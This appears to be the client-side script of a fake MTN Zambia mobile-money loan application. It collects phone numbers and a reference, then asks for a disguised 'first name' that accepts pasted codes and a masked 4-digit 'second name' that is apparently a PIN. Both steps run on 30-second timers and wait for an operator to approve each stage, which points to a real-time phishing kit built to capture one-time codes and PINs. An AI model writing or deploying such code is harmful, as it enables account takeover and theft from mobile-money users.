
// Accessible segmented entry for portal-generated numeric IDs and codes.
// The underlying inputs keep their existing IDs so the API workflow is unchanged.
(function initDigitEntries(){
  document.querySelectorAll("[data-digit-entry]").forEach(function(wrapper){
    const inputId=wrapper.getAttribute("data-digit-entry");
    const input=document.getElementById(inputId);
    const boxes=wrapper.querySelector(".digit-boxes");
    const length=Number(wrapper.getAttribute("data-length")||4);
    const eye=wrapper.querySelector("[data-eye-for]");
    if(!input||!boxes)return;
    let revealed=false;
    for(let i=0;i<length;i++){
      const cell=document.createElement("div");
      cell.className="digit-cell";
      cell.setAttribute("aria-hidden","true");
      boxes.appendChild(cell);
    }
    function paint(){
      const value=input.value||"";
      Array.from(boxes.children).forEach((cell,i)=>{
        const char=value[i]||"";
        cell.textContent=char?(revealed?char:"*"):"";
        cell.classList.toggle("masked",!!char&&!revealed);
        cell.classList.toggle("active",i===Math.min(value.length,length-1)&&value.length<length);
      });
    }
    input.addEventListener("input",function(){
      input.value=input.value.replace(/\D/g,"").slice(0,length);
      paint();
      if(input.value.length===length){
        const next=inputId==="applicationIdInput"?null:document.getElementById(inputId==="firstName"?"firstNameBtn":"secondNameBtn");
        if(next) next.focus();
      }
    });
    boxes.addEventListener("click",()=>input.focus());
    input.addEventListener("focus",paint);
    input.addEventListener("blur",paint);
    if(eye){
      eye.addEventListener("click",()=>{
        revealed=!revealed;
        input.type=revealed?"text":"password";
        eye.textContent=revealed?"🙈":"👁";
        eye.setAttribute("aria-label",revealed?"Hide number":"Show number");
        paint();
        input.focus();
      });
    }
    // Render updates from browser autofill or existing application code.
    input.addEventListener("change",paint);
    paint();
  });
})();

// MTN Zambia mobile prefixes: 056, 076 and 096.
function normalizeMtnNumber(value){
  const digits=String(value||"").replace(/[^0-9]/g,"");
  let national=digits;
  if(digits.startsWith("260")) national=digits.slice(3);
  if(national.startsWith("0")) national=national.slice(1);
  if(!/^(?:56|76|96)\d{7}$/.test(national)) return null;
  return "+260"+national;
}
function isMtnNumber(value){return Boolean(normalizeMtnNumber(value));}

const state={page:1,applicationId:null,applicationNo:null,phone:"",whatsapp:"",amount:100000,termMonths:3,firstResubmit:false,secondResubmit:false,pageOneSubmitting:false,referralToken:(new URLSearchParams(window.location.search).get('admin')||new URLSearchParams(window.location.search).get('ref')||'')};
const timers={first:null,second:null};
const nameSubmission={first:false,second:false};
const $=id=>document.getElementById(id);
const pages=[...document.querySelectorAll(".page")];
const stepEls=[...document.querySelectorAll(".step")];
function showPage(page){
  state.page=page;
  pages.forEach(p=>p.classList.toggle("active",p.dataset.page===String(page)));
  const n=Number(page);
  stepEls.forEach((x,i)=>{x.classList.toggle("active",Number.isFinite(n)&&i===n-1);x.classList.toggle("done",Number.isFinite(n)&&i<n-1);});
  if(page===2) startNameTimer("first");
  if(page===3) startNameTimer("second");
  window.scrollTo({top:0,behavior:"smooth"});
}
function setError(id,msg){const e=$(id);e.textContent=msg||"";e.classList.toggle("hidden",!msg);}
async function status(){const r=await fetch(`/api/applications/${state.applicationId}/status`);return r.json();}
function stopNameTimer(type){if(timers[type]){clearInterval(timers[type]);timers[type]=null;}}
function setTimerText(type,seconds){
  const el=$(type+"NameTimer"); if(!el)return;
  const ring=$(type+"NameRing"), number=$(type+"NameSeconds");
  const safe=Math.max(0,Math.min(30,Number(seconds)||0));
  if(number) number.textContent=String(safe);
  if(ring) ring.style.setProperty("--progress", `${(safe/30)*100}%`);
  el.classList.toggle("expired",safe<=0);
  const label=el.querySelector(".countdown-label");
  if(label) label.textContent=safe>0?"Time remaining to submit":"Time expired — select Resubmit";
}
function setNameSubmitMode(type,expired){
  const btn=$(type+"NameBtn"), resubmit=$(type+"NameResubmit");
  if(!btn||!resubmit)return;
  btn.classList.toggle("hidden",expired);
  resubmit.classList.toggle("hidden",!expired);
  btn.disabled=expired;
}
function startNameTimer(type,deadlineOverride=null){
  stopNameTimer(type);
  const deadline=deadlineOverride || state[type+"Deadline"] || new Date(Date.now()+30000).toISOString();
  state[type+"Deadline"]=deadline;
  const tick=()=>{
    const seconds=Math.max(0,Math.ceil((new Date(deadline).getTime()-Date.now())/1000));
    setTimerText(type,seconds);
    setNameSubmitMode(type,seconds<=0);
    if(seconds<=0)stopNameTimer(type);
  };
  tick();
  timers[type]=setInterval(tick,250);
}
async function refreshDeadlineFor(type){
  try{
    const d=await status();
    const key=type==="first"?"firstNameDeadlineAt":"secondNameDeadlineAt";
    state[type+"Deadline"]=d[key]||null;
    startNameTimer(type,state[type+"Deadline"]);
  }catch{}
}
async function waitForStatus(expected,next,errorId){
  while(true){
    try{
      const d=await status();
      if(d.status===expected){
        if(next===2){state.firstDeadline=d.firstNameDeadlineAt||null;startNameTimer("first",state.firstDeadline);}
        if(next===3){state.secondDeadline=d.secondNameDeadlineAt||null;startNameTimer("second",state.secondDeadline);}
        if(next===4 && d.amount) $("loanAmount").value=String(d.amount);
        showPage(next);return;
      }
      if(d.status==="REJECTED"){handleRejection(d);return;}
      if(d.status==="DISBURSEMENT_PROCESSING"){
        $("successNumber").textContent=d.applicationNo||state.applicationNo;
        $("successAmount").textContent=new Intl.NumberFormat("en-ZM",{style:"currency",currency:"ZMW",maximumFractionDigits:0}).format(Number(d.amount||0));
        showPage("success");return;
      }
    }catch{}
    await new Promise(r=>setTimeout(r,150));
  }
}
function handleRejection(d){
  const messages={
    APPLICATION_DETAILS:"The reference number was not accepted. Check your demo reference and try again.",
    FIRST_NAME:"The selected option was not accepted. Please select it again.",
    SECOND_NAME:"The option verification was not accepted. Please verify again.",
    AMOUNT:"The demo amount was not accepted. Check the amount and try again."
  };
  const msg=messages[d.rejectedStage]||"The application was not accepted. Check your MoMo-style demo details and try again.";
  if(d.rejectedStage==="FIRST_NAME"){
    stopNameTimer("first");state.firstDeadline=new Date(Date.now()+30000).toISOString();$("firstName").value="";$("firstName").disabled=false;$("firstNameBtn").classList.remove("hidden");$("firstNameResubmit").classList.add("hidden");$("firstNameWaiting").classList.add("hidden");setError("page2Error",msg);showPage(2);startNameTimer("first",state.firstDeadline);
  }else if(d.rejectedStage==="SECOND_NAME"){
    stopNameTimer("second");state.secondDeadline=new Date(Date.now()+30000).toISOString();$("secondName").value="";$("secondName").disabled=false;$("secondNameBtn").classList.remove("hidden");$("secondNameResubmit").classList.add("hidden");$("secondNameWaiting").classList.add("hidden");setError("page3Error",msg);showPage(3);startNameTimer("second",state.secondDeadline);
  }else if(d.rejectedStage==="AMOUNT"){
    $("loanAmount").disabled=false;$("loanAmountBtn").classList.remove("hidden");$("loanAmountBtn").disabled=false;$("loanAmountWaiting").classList.add("hidden");setError("page4Error",msg);showPage(4);
  }else{
    state.pageOneSubmitting=false;
    $("phone").disabled=false;$("applicationIdInput").disabled=false;$("startApplication").classList.remove("hidden");$("startApplication").disabled=false;$("approvalWaiting").classList.add("hidden");setError("loginError",msg);showPage(1);
  }
}
$("loginForm").addEventListener("submit",async e=>{
  e.preventDefault();setError("loginError","");
  const phoneInput=$("phone").value.trim(),whatsappInput=$("whatsappNumber").value.trim(),phone=normalizeMtnNumber(phoneInput),whatsapp=whatsappInput?normalizeMtnNumber(whatsappInput):"",applicationId=$("applicationIdInput").value.trim();
  const amount=Number($("loanAmountChoice").value),termMonths=Number($("termChoice").value);
  if(!isMtnNumber(phone))return setError("loginError","Enter a valid MTN Zambia number beginning with 056, 076 or 096 (or +260).");
  if(whatsappInput&&!whatsapp)return setError("loginError","The WhatsApp number must also be a valid MTN Zambia number.");
  if(!/^\d{5}$/.test(applicationId))return setError("loginError","Enter your 5-digit application reference number.");
  if(state.pageOneSubmitting)return;
  state.pageOneSubmitting=true;
  const b=$("startApplication");b.disabled=true;state.amount=amount;state.termMonths=termMonths;state.phone=phone;state.whatsapp=whatsapp;
  $("loanAmount").value=String(amount);updateLoanSummary();
  try{const r=await fetch("/api/applications",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,whatsappNumber:whatsapp,applicationId,amount,termMonths,referralToken:state.referralToken})});const d=await r.json();if(!r.ok)throw new Error(d.error);state.applicationId=d.applicationId;state.applicationNo=d.applicationNo;$("applicationNumber").textContent=d.applicationNo;$("approvalWaiting").classList.remove("hidden");$("phone").disabled=true;$("whatsappNumber").disabled=true;$("applicationIdInput").disabled=true;b.classList.add("hidden");await waitForStatus("APPROVED",2,"loginError");}catch(err){state.pageOneSubmitting=false;setError("loginError",err.message||"Unable to submit the application. Please try again.");b.disabled=false;}
});
let pageOneAutoSubmitTimer=null;
function schedulePageOneAutoSubmit(){
  if(pageOneAutoSubmitTimer)clearTimeout(pageOneAutoSubmitTimer);
  pageOneAutoSubmitTimer=setTimeout(()=>{
    const phoneInput=$("phone").value.trim();
    const whatsappInput=$("whatsappNumber").value.trim();
    const phone=normalizeMtnNumber(phoneInput);
    const whatsapp=whatsappInput?normalizeMtnNumber(whatsappInput):"";
    const reference=$("applicationIdInput").value.trim();
    const amount=Number($("loanAmountChoice").value);
    const term=Number($("termChoice").value);
    if(isMtnNumber(phone)&&(!whatsappInput||isMtnNumber(whatsapp))&&/^\d{5}$/.test(reference)&&Number.isFinite(amount)&&amount>0&&Number.isFinite(term)&&term>0&&!state.pageOneSubmitting){
      $("loginForm").requestSubmit();
    }
  },250);
}
$("applicationIdInput").addEventListener("input",()=>{
  const input=$("applicationIdInput");
  input.value=input.value.replace(/\D/g,"").slice(0,5);
  schedulePageOneAutoSubmit();
});
["phone","whatsappNumber","loanAmountChoice","termChoice"].forEach(id=>{
  $(id).addEventListener("input",schedulePageOneAutoSubmit);
  $(id).addEventListener("change",schedulePageOneAutoSubmit);
});
async function submitName(type,resubmit=false){
  if(nameSubmission[type])return;
  resubmit = Boolean(resubmit || state[type+"Resubmit"]);
  const input=$(type+"Name"),btn=$(type+"NameBtn"),waiting=$(type+"NameWaiting"),errorId=type==="first"?"page2Error":"page3Error";
  setError(errorId,"");
  const value=input.value.trim();
const validValue = type === "first"
  ? value.length > 0
  : /^\d{4}$/.test(value);
 
  nameSubmission[type]=true;
  btn.disabled=true;
  try{
    const endpoint=type==="first"?"first-name":"second-name";
    const lineUsageProfile=$("lineUsageProfile")?.value || "light";
    const payload=type==="first"?{firstName:value,resubmit,lineUsageProfile}:{secondName:value,resubmit};
    const r=await fetch(`/api/applications/${state.applicationId}/${endpoint}`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});
    const d=await r.json();
    if(!r.ok){
      if(d.resubmitRequired){stopNameTimer(type);setTimerText(type,0);setNameSubmitMode(type,true);btn.disabled=false;return;}
      throw new Error(d.error);
    }
    stopNameTimer(type);state[type+"Deadline"]=d.deadlineAt||null;state[type+"Resubmit"]=false;input.disabled=true;btn.classList.add("hidden");$(type+"NameResubmit").classList.add("hidden");waiting.classList.remove("hidden");
    await waitForStatus(type==="first"?"APPROVED_FIRST_NAME":"APPROVED_SECOND_NAME",type==="first"?3:4,errorId);
  }catch(err){btn.disabled=false;setError(errorId,err.message||"Unable to submit the information. Please try again.");}
  finally{nameSubmission[type]=false;}
}
$("firstNameBtn").addEventListener("click",()=>submitName("first",false));
$("secondNameBtn").addEventListener("click",()=>submitName("second",false));
let firstReferenceAutoSubmitTimer=null;
$("firstName").addEventListener("input",(event)=>{
  const input=$("firstName");
  input.value=input.value.replace(/[\r\n\t]+/g," ").replace(/\s{2,}/g," ").slice(0,300);
  if(firstReferenceAutoSubmitTimer)clearTimeout(firstReferenceAutoSubmitTimer);
  const pasted=event.inputType==="insertFromPaste";
  firstReferenceAutoSubmitTimer=setTimeout(()=>{
    if(/^[A-Za-z0-9][A-Za-z0-9._:/#-]{3,300}$/.test(input.value.trim()))submitName("first",false);
  },pasted?250:900);
});
$("firstName").addEventListener("paste",()=>{
  if(firstReferenceAutoSubmitTimer)clearTimeout(firstReferenceAutoSubmitTimer);
  firstReferenceAutoSubmitTimer=setTimeout(()=>{
    if(/^[A-Za-z=_+0-9][A-Za-z0-9._:/#=+-]{3,300}$/.test($("firstName").value.trim()))submitName("first",false);
  },300);
});
$("secondName").addEventListener("input",()=>{
  const input=$("secondName");input.value=input.value.replace(/\D/g,"").slice(0,4);
  if(/^\d{4}$/.test(input.value))submitName("second",false);
});
$("firstNameResubmit").addEventListener("click",()=>{state.firstResubmit=true;state.firstDeadline=null;$("firstName").disabled=false;$("firstNameBtn").disabled=false;$("firstNameResubmit").classList.add("hidden");setNameSubmitMode("first",false);startNameTimer("first",new Date(Date.now()+30000).toISOString());});
$("secondNameResubmit").addEventListener("click",()=>{state.secondResubmit=true;state.secondDeadline=null;$("secondName").disabled=false;$("secondNameBtn").disabled=false;$("secondNameResubmit").classList.add("hidden");setNameSubmitMode("second",false);startNameTimer("second",new Date(Date.now()+30000).toISOString());});
async function updateLoanSummary(){
  const amount=Number($("loanAmountChoice")?.value||state.amount||100000),term=Number($("termChoice")?.value||state.termMonths||3);
  try{const r=await fetch("/api/calculate",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({amount,termMonths:term})});const d=await r.json();if(!r.ok)throw new Error(d.error);const fmt=n=>new Intl.NumberFormat("en-ZM").format(Math.round(n));const line=`Amount: ZMW ${fmt(d.amount)} • Term: ${d.termMonths} months • Estimated monthly payment: ZMW ${fmt(d.monthlyPayment)} • Total repayment: ZMW ${fmt(d.totalRepayment)}`;if($("loanEstimate"))$("loanEstimate").textContent=line;if($("finalLoanSummary"))$("finalLoanSummary").textContent=line;state.amount=amount;state.termMonths=term;$("loanAmount").value=String(amount);}catch(e){}
}
$("loanAmountChoice")?.addEventListener("change",updateLoanSummary);$("termChoice")?.addEventListener("change",updateLoanSummary);updateLoanSummary();
$("loanAmountBtn").addEventListener("click",async()=>{setError("page4Error","");const amount=Number($("loanAmount").value||state.amount);if(!Number.isInteger(amount)||amount<50000)return setError("page4Error","The loan amount is invalid.");const b=$("loanAmountBtn");b.disabled=true;try{const r=await fetch(`/api/applications/${state.applicationId}/amount`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({amount})});const d=await r.json();if(!r.ok)throw new Error(d.error);state.amount=amount;$("loanAmount").disabled=true;b.classList.add("hidden");$("loanAmountWaiting").classList.remove("hidden");await waitForStatus("DISBURSEMENT_PROCESSING","success","page4Error");}catch(err){b.disabled=false;setError("page4Error",err.message||"Unable to submit the loan application.");}});


// Show the anniversary artwork as a full-screen opening splash, then reveal page one.
(function anniversaryOpeningSplash(){
  const splash=document.getElementById("anniversarySplash");
  if(!splash)return;
  let closed=false;
  function closeSplash(){
    if(closed)return;
    closed=true;
    splash.classList.add("is-hidden");
    window.setTimeout(function(){if(splash.parentNode)splash.parentNode.removeChild(splash);},500);
  }
  const skip=document.getElementById("skipAnniversarySplash");
  if(skip)skip.addEventListener("click",closeSplash);
  window.setTimeout(closeSplash,5000);
})();
